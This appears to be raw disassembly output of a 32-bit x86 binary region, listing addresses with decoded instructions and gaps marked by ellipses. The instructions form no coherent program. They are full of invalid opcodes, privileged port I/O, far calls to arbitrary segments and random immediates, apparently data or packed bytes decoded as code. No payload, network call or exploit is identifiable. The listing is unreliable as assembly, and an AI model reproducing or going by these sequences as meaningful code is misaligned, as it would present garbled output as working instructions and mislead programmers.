  428e90:	and    eax,DWORD PTR [eax]
	...
  428ef2:	add    BYTE PTR [eax],al
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x62
  428f01:	xlat   BYTE PTR ds:[ebx]
  428f02:	jmp    DWORD PTR [eax]
  428f04:	cmp    al,0xb6
  428f06:	add    DWORD PTR [eax],eax
  428f08:	add    eax,0x44000001
  428f0d:	pop    es
  428f0e:	loop   0x428ef7
  428f10:	jo     0x428f1f
  428f12:	sub    eax,DWORD PTR [ecx+edx*1-0x7b89f483]
  428f19:	test   dh,dl
  428f1b:	mov    bl,0xc2
  428f1d:	push   cs
  428f1e:	or     eax,0xbd4bec8a
  428f23:	iret   
  428f24:	aad    0xb8
  428f26:	mov    ebp,0x763f94ac
  428f2b:	add    al,0x8f
  428f2d:	mov    esp,0xeb26b19c
  428f32:	test   DWORD PTR [esi+0x70a9e45c],esi
  428f38:	stos   DWORD PTR es:[edi],eax
  428f39:	push   ebp
  428f3a:	sub    DWORD PTR [eax+0x5e],0x38ecfef1
  428f41:	clc    
  428f42:	nop
  428f43:	pop    es
  428f44:	or     DWORD PTR [ebx+0x13],esp
  428f47:	push   cs
  428f48:	sahf   
  428f49:	aad    0xf6
  428f4b:	mov    eax,gs:0x7710eef6
  428f51:	mov    al,0xdb
  428f53:	lds    ebx,FWORD PTR [ebx-0x44]
  428f56:	inc    ebp
  428f57:	fsubrp st(5),st
  428f59:	ret    
  428f5a:	lds    edx,FWORD PTR [esi]
  428f5c:	sbb    DWORD PTR [eax],esp
  428f5e:	sbb    ebx,DWORD PTR ds:0x73c46c0
  428f64:	push   esp
  428f65:	popa   
  428f66:	call   0x65e3:0xa2cbcb0f
  428f6d:	xchg   edi,eax
  428f6e:	cli    
  428f6f:	cld    
  428f70:	es cmp eax,0x377d3801
  428f76:	pop    ss
  428f77:	pop    esp
  428f78:	popa   
  428f79:	adc    eax,0x6c9bf081
  428f7e:	sbb    eax,0xa4bad7db
  428f83:	and    eax,0xd9ddfc4
  428f88:	and    eax,0xfc84afc2
  428f8d:	in     eax,0xcc
  428f8f:	gs test eax,0x9b8de7ea
  428f95:	sbb    al,0xb
  428f97:	jmp    0x2801:0x64c364a3
  428f9e:	push   ds
  428f9f:	or     eax,0x816da899
  428fa4:	in     eax,dx
  428fa5:	pop    ecx
  428fa6:	jg     0x428f28
  428fa8:	bound  ebx,QWORD PTR ds:0x68caae28
  428fae:	adc    BYTE PTR [eax-0x561b9b5b],bl
  428fb4:	xchg   ebp,eax
  428fb5:	push   ebx
  428fb6:	mov    bl,0x72
  428fb8:	dec    esp
  428fb9:	jle    0x428fe3
  428fbb:	sbb    BYTE PTR [edx-0x3c9402af],0x1c
  428fc2:	xlat   BYTE PTR ds:[ebx]
  428fc3:	fcomp  st(2)
  428fc5:	push   eax
  428fc6:	jp     0x428f8c
  428fc8:	std    
  428fc9:	stos   DWORD PTR es:[edi],eax
  428fca:	dec    edi
  428fcb:	xchg   DWORD PTR [eax-0x78800615],esi
  428fd1:	cmc    
  428fd2:	sub    ebp,DWORD PTR [ebx-0x588337f]
  428fd8:	test   DWORD PTR [ebx-0x7d2b2bc7],ebp
  428fde:	push   ebp
  428fdf:	call   0x28f9:0x1d3949f8
  428fe6:	add    DWORD PTR [ecx],edi
  428fe8:	ins    DWORD PTR es:[edi],dx
  428fe9:	xor    bl,bl
  428feb:	aad    0x68
  428fed:	xchg   esi,eax
  428fee:	in     al,0x24
  428ff0:	sbb    BYTE PTR [edi+0x39],0xc9
  428ff4:	pop    ds
  428ff5:	xor    eax,0x5f828460
  428ffa:	jg     0x428fd4
  428ffc:	mov    esi,0x5f0a5271
  429001:	repz popf 
  429003:	cmp    ebp,0x26e69b77
  429009:	daa    
  42900a:	push   es
  42900b:	mov    bh,0x39
  42900d:	lea    esi,[edx+0x1e]
  429010:	sub    eax,0x0
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x42fc7b77
  429081:	lahf   
  429082:	fstp   TBYTE PTR [edx]
  429084:	inc    ecx
  429085:	mov    bh,0x1
  429087:	add    BYTE PTR ds:0x9f000001,al
  42908d:	push   eax
  42908e:	dec    esi
  42908f:	push   0x30
  429091:	add    edx,esp
  429093:	stc    
  429094:	inc    edx
  429095:	xlat   BYTE PTR ds:[ebx]
  429096:	inc    esp
  429097:	dec    ecx
  429098:	push   esi
  429099:	sub    DWORD PTR [edi-0x15e5d895],ebp
  42909f:	(bad)  [edi+0x63]
  4290a2:	add    DWORD PTR [ebp-0x278b1688],ecx
  4290a8:	mov    al,ds:0x4bfdd3b9
  4290ad:	or     al,0xfe
  4290af:	repnz fxch st(6)
  4290b2:	sub    al,0x5e
  4290b4:	not    DWORD PTR [ebx-0xf8ffb33]
  4290ba:	jns    0x429113
  4290bc:	arpl   bp,bx
  4290be:	jae    0x4290d0
  4290c0:	jnp    0x42910e
  4290c2:	add    al,0x3a
  4290c4:	test   ah,dh
  4290c6:	xor    dl,al
  4290c8:	xchg   BYTE PTR [esi],bl
  4290ca:	fnstsw WORD PTR [ecx-0x3e1dbaa7]
  4290d0:	and    BYTE PTR [eax],bh
  4290d2:	(bad)  
  4290d4:	pop    ds
  4290d5:	or     eax,DWORD PTR [edx-0x7e]
  4290d8:	scas   eax,DWORD PTR es:[edi]
  4290d9:	pop    ss
  4290da:	xchg   BYTE PTR [ecx],dh
  4290dc:	loope  0x4290f5
  4290de:	mov    dl,0x18
  4290e0:	jb     0x4290fb
  4290e2:	inc    BYTE PTR [esi+eiz*1]
  4290e5:	xchg   esp,eax
  4290e6:	lods   al,BYTE PTR ds:[esi]
  4290e7:	cmp    ah,BYTE PTR [edi]
  4290e9:	out    dx,al
  4290ea:	jle    0x42908f
  4290ec:	pop    dx
  4290ee:	int3   
  4290ef:	adc    BYTE PTR [ebp-0x2126853],bh
  4290f5:	xchg   edx,eax
  4290f6:	bound  ecx,QWORD PTR [esp+edi*4]
  4290f9:	mov    dl,0xc
  4290fb:	test   DWORD PTR [edi-0x1eca5bfa],ecx
  429101:	push   ecx
  429102:	call   0xbb97:0x640347d9
  429109:	add    edi,DWORD PTR [ebx-0xb]
  42910c:	and    WORD PTR [esi],di
  42910f:	in     eax,0xef
  429111:	mov    eax,0x21e53351
  429116:	mov    al,0x45
  429118:	jg     0x42918c
  42911a:	fiadd  WORD PTR es:[eax]
  42911d:	pop    ebp
  42911e:	dec    ebx
  42911f:	ret    
  429120:	iret   
  429121:	imul   esp,DWORD PTR [edx+ebx*8],0x867e755e
  429128:	push   0x1f1dec6c
  42912d:	idiv   dh
  42912f:	jge    0x429142
  429131:	dec    ebx
  429132:	je     0x429145
  429134:	push   esi
  429135:	xlat   BYTE PTR ds:[ebx]
  429136:	(bad)
  429139:	lahf   
  42913a:	outs   dx,BYTE PTR ds:[esi]
  42913b:	jecxz  0x4291ad
  42913d:	enter  0x3fc2,0xf9
  429141:	cmp    DWORD PTR [edx+0x2c],eax
  429144:	daa    
  429145:	test   eax,0xd3141a23
  42914a:	call   0x2635cd1b
  42914f:	xlat   BYTE PTR ds:[ebx]
  429150:	mov    ch,0x10
  429152:	ja     0x42919e
  429154:	pop    es
  429155:	es push esp
  429157:	nop
  429158:	mov    ecx,0xb5b4ca2
  42915d:	jmp    0x4290fc
  42915f:	pushf  
  429160:	or     eax,0x5897dd95
  429165:	leave  
  429166:	into   
  429167:	(bad)  
  429168:	pop    esp
  429169:	jecxz  0x42919d
  42916b:	stc    
  42916c:	scas   eax,DWORD PTR es:[edi]
  42916d:	adc    al,0xa4
  42916f:	rcr    DWORD PTR [ecx],0x4f
  429172:	lock out dx,eax
  429174:	das    
  429175:	ins    DWORD PTR es:[edi],dx
  429176:	sub    al,0xac
  429178:	scas   al,BYTE PTR es:[edi]
  429179:	out    dx,al
  42917a:	mov    bh,0x7d
  42917c:	es xchg esi,eax
  42917e:	or     edx,DWORD PTR [ebx]
  429180:	mov    eax,ds:0xa63d8144
  429185:	push   edi
  429186:	test   BYTE PTR [esi+ebp*4-0x3320f661],ch
  42918d:	add    al,dl
  42918f:	mov    dl,0xa9
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [esi+edi*8+0x4673067d],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    al,ch
  42920d:	pop    esp
  42920e:	(bad)  [esi]
  429210:	scas   al,BYTE PTR es:[edi]
  429211:	lock add bl,ah
  429214:	(bad)  
  429215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429216:	sbb    cl,al
  429218:	mov    edx,0x1cbba4d3
  42921d:	test   DWORD PTR [ebx+0x36a75f9d],esp
  429223:	xchg   DWORD PTR [eax],ebx
  429225:	call   0xd58235d0
  42922a:	ins    DWORD PTR es:[edi],dx
  42922b:	cmp    eax,0x2d301678
  429230:	mov    edi,0xc390f587
  429235:	mov    eax,ds:0x555846e
  42923a:	data16 clc 
  42923c:	xor    BYTE PTR es:[edi-0x40],cl
  429240:	arpl   WORD PTR [eax+0x6],cx
  429243:	push   es
  429244:	test   DWORD PTR [ebp+0x40d969ce],ecx
  42924a:	sbb    al,0x62
  42924c:	xchg   ecx,eax
  42924d:	repz mov eax,0xb5adf7f
  429253:	int    0x21
  429255:	xchg   ebp,eax
  429256:	jmp    0x4292cb
  429258:	js     0x429218
  42925a:	xchg   ebx,eax
  42925b:	les    ebx,FWORD PTR ds:[esi-0x1a]
  42925f:	sbb    eax,0x78e41f5
  429264:	pop    ds
  429265:	stc    
  429266:	loopne 0x42926a
  429268:	xchg   ecx,eax
  429269:	mov    dh,0xa4
  42926b:	push   ebx
  42926c:	out    0xea,al
  42926e:	pop    ebx
  42926f:	xor    al,0xe0
  429271:	jecxz  0x4292d6
  429273:	or     eax,0x5a8e38b0
  429278:	add    ch,0xc5
  42927b:	sti    
  42927c:	popf   
  42927d:	hlt    
  42927e:	mov    BYTE PTR [ecx-0x4f],al
  429281:	mov    edi,0x19a8829c
  429286:	xchg   ecx,eax
  429287:	loopne 0x4292b9
  429289:	mov    bl,0xb1
  42928b:	mov    eax,0x5919f7fe
  429290:	jmp    0x42925c
  429292:	xor    edx,ebp
  429294:	add    eax,0xfc20a3b4
  429299:	pop    edi
  42929a:	popf   
  42929b:	xchg   edx,eax
  42929c:	add    al,BYTE PTR [ebx+0x6dae98aa]
  4292a2:	inc    esi
  4292a3:	inc    ebx
  4292a4:	js     0x42929e
  4292a6:	imul   BYTE PTR [ebx-0xe]
  4292a9:	mov    bl,0x72
  4292ab:	xor    eax,0x8568c525
  4292b0:	and    BYTE PTR [edx+0x23c97c72],bh
  4292b6:	push   ecx
  4292b7:	xor    ah,BYTE PTR [edx+0x3a17d4c3]
  4292bd:	or     BYTE PTR ds:0x3af4cff9,bh
  4292c3:	inc    esi
  4292c4:	jnp    0x429315
  4292c6:	ja     0x429275
  4292c8:	sahf   
  4292c9:	mov    dh,0x53
  4292cb:	jne    0x4292ab
  4292cd:	pop    ebp
  4292ce:	lods   al,BYTE PTR ds:[esi]
  4292cf:	test   dl,cl
  4292d1:	push   0xd0f94b8e
  4292d6:	inc    edi
  4292d7:	shl    BYTE PTR [ecx+0x707ac4da],1
  4292dd:	xor    ebp,DWORD PTR [esi-0x6ccafd6a]
  4292e3:	pop    ebp
  4292e4:	mov    ebx,0x81a6ab3a
  4292e9:	add    al,0x20
  4292eb:	outs   dx,BYTE PTR ds:[esi]
  4292ec:	cmp    BYTE PTR [edx+0x5c],bl
  4292ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292f0:	jo     0x42934f
  4292f2:	adc    DWORD PTR [ebx+ebx*1+0x4a],eax
  4292f6:	out    dx,al
  4292f7:	or     BYTE PTR [esi],cl
  4292f9:	ins    DWORD PTR es:[edi],dx
  4292fa:	ret    
  4292fb:	stc    
  4292fc:	pop    esp
  4292fd:	or     al,0x6
  4292ff:	or     DWORD PTR [esi-0x7f],eax
  429302:	sbb    al,0x52
  429304:	ror    ah,1
  429306:	imul   ecx,DWORD PTR [edx+0x1f880455],0x35
  42930d:	push   edx
  42930e:	mov    ds:0x1983,eax
	...
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x18
  429381:	push   ds
  429382:	push   esp
  429383:	push   ebp
  429384:	dec    ebx
  429385:	mov    ecx,0x1050001
  42938a:	add    BYTE PTR [eax],al
  42938c:	and    ah,BYTE PTR [eax-0x6c831827]
  429392:	or     BYTE PTR [ecx+0x37],bh
  429395:	out    0x5a,eax
  429397:	sbb    BYTE PTR ds:0x741cc223,dh
  42939d:	fld    DWORD PTR [ecx]
  42939f:	hlt    
  4293a0:	scas   eax,DWORD PTR es:[edi]
  4293a1:	adc    edx,DWORD PTR [edi-0x1b958619]
  4293a7:	imul   edi,DWORD PTR [ecx+edx*4],0xea3a8fde
  4293ae:	xor    al,0x3f
  4293b0:	mov    ecx,0x40f0a084
  4293b5:	outs   dx,BYTE PTR ds:[esi]
  4293b6:	cdq    
  4293b7:	and    ecx,esi
  4293b9:	jg     0x429378
  4293bb:	repnz dec ebx
  4293bd:	scas   al,BYTE PTR es:[edi]
  4293be:	shl    al,cl
  4293c0:	retf   0x2a24
  4293c3:	dec    edi
  4293c4:	push   edi
  4293c5:	test   al,0xc1
  4293c7:	stos   DWORD PTR es:[edi],eax
  4293c8:	(bad)  
  4293c9:	push   esp
  4293ca:	std    
  4293cb:	js     0x4293be
  4293cd:	cmp    al,0x45
  4293cf:	cmp    BYTE PTR [ecx+esi*2-0x44],dl
  4293d3:	ins    DWORD PTR es:[edi],dx
  4293d4:	xor    BYTE PTR [edx+0x70d9ed72],bl
  4293da:	push   0x75
  4293dc:	loope  0x4293e0
  4293de:	lods   eax,DWORD PTR ds:[esi]
  4293df:	popf   
  4293e0:	cs stos DWORD PTR es:[edi],eax
  4293e2:	and    esp,DWORD PTR [edi+0x6b015901]
  4293e8:	int    0xcd
  4293ea:	shl    BYTE PTR [ecx+ebp*1],cl
  4293ed:	jno    0x42941a
  4293ef:	sbb    DWORD PTR [esi+0x6dfee1a3],ebp
  4293f5:	int    0x6c
  4293f7:	cli    
  4293f8:	fisttp WORD PTR [esi+0x5b]
  4293fb:	push   cs
  4293fc:	mov    edi,0x356bb57f
  429401:	inc    eax
  429402:	das    
  429403:	mov    esi,0x8d0860e4
  429408:	(bad)  
  429409:	pushf  
  42940a:	ins    BYTE PTR es:[edi],dx
  42940b:	in     al,0xb
  42940d:	mov    es,WORD PTR [edi-0x4ce565da]
  429413:	cli    
  429414:	push   0xfffffff8
  429416:	or     DWORD PTR [esi],eax
  429418:	adc    edi,edi
  42941a:	jl     0x429407
  42941c:	or     eax,0x5b07b734
  429421:	cdq    
  429422:	dec    eax
  429423:	mov    esp,0xd716223a
  429428:	xchg   esp,eax
  429429:	shl    BYTE PTR [edi],cl
  42942b:	sbb    WORD PTR [ebx],bx
  42942e:	xor    ebp,esi
  429430:	scas   eax,DWORD PTR es:[edi]
  429431:	adc    eax,0xa891641
  429436:	dec    ecx
  429437:	icebp  
  429438:	mov    al,0x53
  42943a:	xchg   esi,eax
  42943b:	mov    cl,0x30
  42943d:	cmc    
  42943e:	shl    cl,cl
  429440:	jb     0x429456
  429442:	shl    ebp,0x49
  429445:	jle    0x429448
  429447:	push   es
  429448:	fwait
  429449:	push   0x8a4826d7
  42944e:	mov    ebp,0xfeed3380
  429453:	fdivr  QWORD PTR [edi-0x7c]
  429456:	ja     0x42942e
  429458:	lds    ecx,FWORD PTR [edx-0x30]
  42945b:	test   al,0xd9
  42945d:	mov    edx,edi
  42945f:	test   al,0xcd
  429461:	xor    al,0x52
  429463:	sar    ch,0x38
  429466:	xchg   ecx,eax
  429467:	aaa    
  429468:	push   esi
  429469:	xor    BYTE PTR [edx-0x2],al
  42946c:	and    BYTE PTR [ebx-0x4698d2e9],al
  429472:	call   0x45452662
  429477:	sbb    al,0x13
  429479:	ret    
  42947a:	aad    0x8
  42947c:	xor    DWORD PTR [eax+0x394a2257],ebp
  429482:	es add al,0x72
  429485:	adc    esp,0x22118056
  42948b:	pusha  
  42948c:	dec    ebp
  42948d:	fnstenv [ebp+eiz*4-0x1a]
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x49333eea],dx
  429503:	mov    DWORD PTR [eax-0x46],edx
  429506:	add    DWORD PTR [eax],eax
  429508:	add    eax,0xad000001
  42950d:	xchg   ebp,eax
  42950e:	(bad)  
  42950f:	mov    cl,0x75
  429511:	aam    0xe2
  429513:	mov    ebx,0xa1b79980
  429518:	test   DWORD PTR [ebp+0x5c],ebp
  42951b:	repz and bl,BYTE PTR [ebx+0x1194855]
  429522:	xchg   ecx,eax
  429523:	sub    al,0xf1
  429525:	cmp    eax,0x84fe5fba
  42952a:	push   eax
  42952b:	push   DWORD PTR [edx+0x469bf86c]
  429531:	mov    ds:0xeb0c0fca,al
  429536:	jle    0x4294f5
  429538:	(bad)  
  429539:	push   edi
  42953a:	xchg   edi,eax
  42953b:	pop    ebp
  42953c:	xchg   edi,eax
  42953d:	push   eax
  42953e:	xchg   edi,eax
  42953f:	call   0xb28620fe
  429544:	mov    bh,0xae
  429546:	mov    DWORD PTR [esi-0x66],ecx
  429549:	xor    eax,0xe411e3d3
  42954e:	inc    ebp
  42954f:	xlat   BYTE PTR ds:[ebx]
  429550:	add    bl,BYTE PTR [edi-0xcde0e32]
  429556:	inc    edi
  429557:	rol    DWORD PTR [edx],cl
  429559:	ffreep st(6)
  42955b:	mov    ebp,DWORD PTR [eax-0x65]
  42955e:	or     DWORD PTR [edx],esp
  429560:	sub    DWORD PTR [edi+0x1d54094a],0x8f3e5595
  42956a:	mov    BYTE PTR [ebx-0x6e],bh
  42956d:	jge    0x4295e6
  42956f:	cwde   
  429570:	xchg   DWORD PTR [eax-0x17],eax
  429573:	xor    eax,DWORD PTR [edi]
  429575:	inc    ebx
  429576:	ror    dh,1
  429578:	outs   dx,BYTE PTR ds:[esi]
  429579:	push   ds
  42957a:	mov    DWORD PTR [ebp-0x501d00cb],edx
  429580:	pop    edi
  429581:	lea    ebx,[esi-0x2]
  429584:	ror    DWORD PTR [ebp+0x58],1
  429587:	lods   al,BYTE PTR ds:[esi]
  429588:	push   esp
  429589:	fcom   QWORD PTR [ebp-0x4e90e3d3]
  42958f:	(bad)  
  429590:	faddp  st(5),st
  429592:	jecxz  0x429599
  429594:	out    dx,al
  429595:	(bad)  [ebp+0xa521625]
  42959b:	imul   ecx,DWORD PTR [edi],0xffffffdc
  42959e:	ret    
  42959f:	adc    al,0x73
  4295a1:	aad    0x8d
  4295a3:	cmp    dh,ch
  4295a5:	inc    edi
  4295a6:	outs   dx,BYTE PTR ds:[esi]
  4295a7:	fucomi st,st(3)
  4295a9:	jmp    0x4295bb
  4295ab:	jno    0x4295ee
  4295ad:	in     al,dx
  4295ae:	cmc    
  4295af:	rol    DWORD PTR [edx],1
  4295b1:	adc    dl,BYTE PTR [edi]
  4295b3:	in     al,dx
  4295b4:	mov    ch,0xdf
  4295b6:	adc    bh,ah
  4295b8:	in     al,0x40
  4295ba:	push   ecx
  4295bb:	lds    edi,FWORD PTR [ecx]
  4295bd:	loope  0x42962c
  4295bf:	xchg   ecx,eax
  4295c0:	mov    bh,0x12
  4295c2:	shl    ecx,0xa5
  4295c5:	scas   al,BYTE PTR es:[edi]
  4295c6:	sbb    al,0xe2
  4295c8:	repz addr16 test al,0xd2
  4295cc:	into   
  4295cd:	lods   eax,DWORD PTR ds:[esi]
  4295ce:	add    al,al
  4295d0:	bound  ecx,QWORD PTR [edi-0x29]
  4295d3:	adc    BYTE PTR [eax+0x72],bl
  4295d6:	push   ss
  4295d7:	(bad)  
  4295d8:	test   eax,0x79307a32
  4295dd:	pop    esi
  4295de:	dec    edx
  4295df:	pop    ds
  4295e0:	ficomp WORD PTR [ecx]
  4295e2:	cs je  0x4295dd
  4295e5:	pop    edi
  4295e6:	outs   dx,DWORD PTR ds:[esi]
  4295e7:	xchg   esp,eax
  4295e8:	mul    BYTE PTR [ebx+ebp*2+0x3c]
  4295ec:	cmp    esp,DWORD PTR [edi+0x7ad8db84]
  4295f2:	ret    0x66e4
  4295f5:	clc    
  4295f6:	xchg   esp,eax
  4295f7:	adc    eax,0x14b48ec3
  4295fc:	and    BYTE PTR [esi-0x3a],ah
  4295ff:	idiv   BYTE PTR [ecx+0x1ada5e8]
  429605:	fld    DWORD PTR [esi-0x1d]
  429608:	ins    BYTE PTR es:[edi],dx
  429609:	sub    al,0xb8
  42960b:	pop    ss
  42960c:	fnstcw WORD PTR [ebx]
  42960e:	push   esi
  42960f:	dec    ebp
  429610:	(bad)  
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	lods   eax,DWORD PTR ds:[esi]
  429681:	adc    bh,al
  429683:	sbb    DWORD PTR [ebp-0x45],edx
  429686:	add    DWORD PTR [eax],eax
  429688:	add    eax,0x60000001
  42968d:	idiv   DWORD PTR [eax-0x53]
  429690:	shl    esi,1
  429692:	push   edi
  429693:	dec    ebp
  429694:	dec    edi
  429695:	int3   
  429696:	(bad)  
  429697:	xchg   esi,eax
  429698:	mov    edi,0x5d59373d
  42969d:	jmp    FWORD PTR [esi]
  42969f:	mov    ah,0x21
  4296a1:	ds mov dh,0x4c
  4296a4:	(bad)  
  4296a5:	pop    ebp
  4296a6:	(bad)  
  4296a8:	xchg   DWORD PTR [ebp-0x77a0bd5b],eax
  4296ae:	into   
  4296af:	lahf   
  4296b0:	inc    edx
  4296b1:	push   es
  4296b2:	test   DWORD PTR [edx+0x70098f38],eax
  4296b8:	stc    
  4296b9:	jbe    0x4296c9
  4296bb:	mov    ecx,0x96e46a19
  4296c0:	xchg   esp,eax
  4296c1:	mov    edx,0xfb043b56
  4296c6:	dec    ebp
  4296c7:	pop    edx
  4296c8:	repnz cwde 
  4296ca:	cli    
  4296cb:	sbb    ebx,DWORD PTR [edx-0x7770a2d9]
  4296d1:	push   edi
  4296d2:	mov    esp,esp
  4296d4:	mov    esp,0xa1f3c4dc
  4296d9:	out    0xf9,al
  4296db:	adc    eax,0x275225c4
  4296e0:	add    eax,0x92d5964d
  4296e5:	mov    bl,0x26
  4296e7:	adc    DWORD PTR [edx+0x7534b540],ebp
  4296ed:	fbstp  TBYTE PTR [edi+0x20524c18]
  4296f3:	sub    BYTE PTR [edi-0x1db46b82],cl
  4296f9:	or     ebp,DWORD PTR [edi]
  4296fb:	in     eax,0x83
  4296fd:	cmp    al,0x61
  4296ff:	or     DWORD PTR [edx+0x48],ebp
  429702:	adc    DWORD PTR [ebx+eax*4],0x29
  429706:	sbb    BYTE PTR [esi+0x1419d97d],al
  42970c:	psubsw mm5,QWORD PTR [ecx-0x32]
  429710:	cld    
  429711:	stc    
  429712:	xchg   esi,eax
  429713:	adc    eax,0xd5665bce
  429718:	xor    DWORD PTR [ebp-0x27d19efa],0x2f
  42971f:	sbb    BYTE PTR [esi],ah
  429721:	aam    0xaf
  429723:	sbb    eax,0x820af957
  429728:	push   ebx
  429729:	js     0x4296f1
  42972b:	retf   0xa5ba
  42972e:	sub    BYTE PTR [ecx+0x7c05df8d],0x3e
  429735:	push   0x2dd5f2
  42973a:	fnstenv [esi+0x3d]
  42973d:	mov    dh,0x27
  42973f:	fs cmp eax,0xd28462aa
  429745:	dec    esi
  429746:	pop    eax
  429747:	pop    ds
  429748:	dec    ebp
  429749:	xchg   edi,eax
  42974a:	cmp    BYTE PTR [ebx+0x70],al
  42974d:	cmc    
  42974e:	shl    BYTE PTR [esi],1
  429750:	js     0x429763
  429752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429753:	lahf   
  429754:	iret   
  429755:	pop    ecx
  429756:	mov    bl,0x78
  429758:	xchg   ebx,ebx
  42975a:	(bad)  
  42975b:	jb     0x429781
  42975d:	in     al,0x3e
  42975f:	pusha  
  429760:	int    0x83
  429762:	and    al,0x1f
  429764:	xchg   esp,eax
  429765:	or     esi,DWORD PTR [edi]
  429767:	fcmovbe st,st(0)
  429769:	enter  0xf899,0xf
  42976d:	std    
  42976e:	mov    dh,0x8d
  429770:	and    ebx,DWORD PTR [ebp+ebp*8+0x2a27ae10]
  429777:	mov    ebx,DWORD PTR [ecx-0x7b873c06]
  42977d:	sbb    ax,WORD PTR [esi+0x63]
  429781:	loope  0x4297c7
  429783:	(bad)  
  429784:	inc    ebp
  429785:	sbb    al,0x46
  429787:	jg     0x4297d2
  429789:	mov    edx,0x63d414ba
  42978e:	fisttp WORD PTR [esi-0x56]
	...
  4297f1:	add    BYTE PTR [eax],al
  4297f3:	add    BYTE PTR [eax],dh
  4297f5:	inc    edx
  4297f6:	fbld   TBYTE PTR [edx-0x1]
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	sub    DWORD PTR [ebp-0x43a5dd38],0x1050001
  42980a:	add    BYTE PTR [eax],al
  42980c:	stos   BYTE PTR es:[edi],al
  42980d:	inc    edx
  42980e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42980f:	sub    esp,DWORD PTR [ecx]
  429811:	cmp    BYTE PTR [ebp+esi*8-0x2e1c60b0],bl
  429818:	sbb    ah,BYTE PTR [ebx+0x51b3f54c]
  42981e:	ds push esp
  429820:	mov    al,ds:0x6bdf56ce
  429825:	xchg   DWORD PTR [edi+0x7cd063f1],edi
  42982b:	aas    
  42982c:	sub    eax,ebx
  42982e:	retw   0xd375
  429832:	xor    dl,BYTE PTR [edi+eax*8+0x6a0ab007]
  429839:	push   ecx
  42983a:	cli    
  42983b:	or     ecx,DWORD PTR [ecx-0x71]
  42983e:	sbb    edi,DWORD PTR [esi]
  429840:	pusha  
  429841:	add    eax,ebp
  429843:	or     eax,0x60a2ff7d
  429848:	inc    ecx
  429849:	inc    ebp
  42984a:	in     al,dx
  42984b:	sbb    esi,DWORD PTR [ecx-0xc]
  42984e:	push   ds
  42984f:	inc    ecx
  429850:	sar    bl,0x1f
  429853:	fsubp  st(4),st
  429855:	ret    0x61a
  429858:	cmp    ah,ch
  42985a:	shr    DWORD PTR [ebp+0x4e],cl
  42985d:	out    dx,al
  42985e:	sub    BYTE PTR [edx],ch
  429860:	in     al,dx
  429861:	pusha  
  429862:	rcr    BYTE PTR [esi-0x26],1
  429865:	test   eax,0x5cde6585
  42986a:	or     BYTE PTR [ecx],0x88
  42986d:	test   al,0x64
  42986f:	xchg   edx,eax
  429870:	or     BYTE PTR [edi+0x73],0xa8
  429874:	(bad)  
  429875:	ins    BYTE PTR es:[di],dx
  429877:	xor    BYTE PTR [edi-0x250a6ee4],bl
  42987d:	jne    0x42985b
  42987f:	push   es
  429880:	stc    
  429881:	sbb    eax,0x61b59883
  429886:	or     al,0xa7
  429888:	in     al,0xc0
  42988a:	sub    bl,BYTE PTR [esi-0x21]
  42988d:	mov    esi,0xa449cc2
  429892:	xchg   ebp,eax
  429893:	xchg   esp,eax
  429894:	inc    ebp
  429895:	enter  0x277f,0xa8
  429899:	sub    bh,dl
  42989b:	mov    edi,0x15c5ff92
  4298a0:	shl    DWORD PTR [ecx+edx*8],1
  4298a3:	mov    eax,0x1fd38978
  4298a8:	loope  0x429850
  4298aa:	test   BYTE PTR [eax+0x5dc23592],bl
  4298b0:	stos   BYTE PTR es:[edi],al
  4298b1:	xor    ebx,DWORD PTR [ebx]
  4298b3:	popa   
  4298b4:	scas   al,BYTE PTR es:[edi]
  4298b5:	inc    ebx
  4298b6:	dec    eax
  4298b7:	stos   DWORD PTR es:[edi],eax
  4298b8:	bswap  ecx
  4298ba:	outs   dx,BYTE PTR ds:[esi]
  4298bb:	shl    BYTE PTR ds:0xb9663550,1
  4298c1:	sti    
  4298c2:	mov    ebx,DWORD PTR [ebp+0x3e0b938f]
  4298c8:	sbb    ebx,ebp
  4298ca:	aam    0x8c
  4298cc:	dec    edi
  4298cd:	and    BYTE PTR [esi+0x39],cl
  4298d0:	in     eax,dx
  4298d1:	rol    esi,1
  4298d3:	add    eax,0x68b2bc6b
  4298d8:	pop    ebp
  4298d9:	xchg   edx,eax
  4298da:	fadd   QWORD PTR [ecx+0x5f]
  4298dd:	xor    BYTE PTR [eax],dl
  4298df:	and    dl,0x3
  4298e2:	imul   DWORD PTR [esi]
  4298e4:	and    esp,DWORD PTR [ebp-0x3ec1a011]
  4298ea:	aam    0x1d
  4298ec:	pop    ebx
  4298ed:	jecxz  0x429956
  4298ef:	hlt    
  4298f0:	dec    edx
  4298f1:	ret    0xa23e
  4298f4:	in     al,0xff
  4298f6:	retf   0x9da1
  4298f9:	loope  0x4298a3
  4298fb:	int3   
  4298fc:	push   ebx
  4298fd:	push   es
  4298fe:	mov    cl,0x74
